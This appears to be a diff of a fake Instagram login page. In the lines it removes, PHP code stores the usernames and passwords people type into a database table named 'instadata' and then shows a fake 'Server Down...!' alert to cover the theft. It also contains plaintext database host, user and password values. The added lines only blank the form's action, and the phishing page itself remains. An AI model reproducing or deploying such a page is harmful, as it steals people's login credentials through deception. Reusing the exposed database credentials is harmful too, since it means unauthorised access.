@@ -1,43 +1,4 @@
-<?php
-$server = "sql110.infinityfree.com";
-$user = "if0_37168760";
-$password = "eTRS1VQ5Y5A";
-$db = "if0_37168760_siteform";
 
-// Database connection
-$conn = new mysqli($server, $user, $password, $db);
-if ($conn->connect_error) {
-    die("Connection failed: " . $conn->connect_error);
-}
-
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Get the username and password from the form
-    $username = $_POST["username"];
-    $password = $_POST["password"];
-
-    // Prepare the SQL query to insert data
-    $sql = "INSERT INTO instadata (username, password) VALUES (?, ?)";
-
-    // Create a prepared statement
-    $stmt = $conn->prepare($sql);
-
-    // Bind the parameters to the prepared statement
-    $stmt->bind_param("ss", $username, $password);
-
-    // Execute the prepared statement
-    if ($stmt->execute()) {
-        echo "<script>alert('Server Down...!');</script>";
-    } else {
-        echo "<script>alert('Error inserting data: " . $stmt->error . "');</script>";
-    }
-
-    // Close the prepared statement
-    $stmt->close();
-}
-
-// Close the database connection
-$conn->close();
-?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -305,7 +266,7 @@ $conn->close();
             <div class="logo">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
             </div>
-            <form class="login-form" method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
+            <form class="login-form" method="post" action="">
                 <div class="input-group">
                     <input type="text" id="username" name="username" placeholder="" required>
                     <label for="username">Phone number, username, or email</label>
